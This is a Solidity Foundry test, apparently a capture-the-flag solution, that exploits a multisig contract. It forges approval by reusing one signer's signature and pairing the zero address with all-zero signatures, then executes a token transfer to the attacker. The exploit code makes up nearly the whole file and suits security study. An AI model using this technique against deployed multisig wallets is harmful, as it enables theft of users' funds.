// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {MultisigBaseTest} from "./MultisigBase.t.sol";

contract MultisigTest is MultisigBaseTest {
    function testExploit() external validation {
      bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(this), 100 ether);
      for(uint i = 0; i < 4; i++) {
        multisig.submitTransaction(payable(address(token)), data);
      }
      bytes memory sigU = hex"ddbfaf1f1237db98f2e8517d9c2111c6184e927a9489c3ec30a95903fd16de59110b30fee6f7fb2f440dc22d58a7a4ec2ee5966d81e3e1bf66c9473bda6a911e1b";
      bytes memory sig0 = hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
      bytes[] memory signature = new bytes[](4);
      signature[0] = sigU;
      signature[1] = sig0;
      signature[2] = sigU;
      signature[3] = sig0;
      address[] memory signerList = new address[](4);
      signerList[0] = user0;
      signerList[1] = address(0);
      signerList[2] = user0;
      signerList[3] = address(0);
      multisig.confirmTransaction(3, signature, signerList);
      multisig.executeTransaction(3);
    }
}
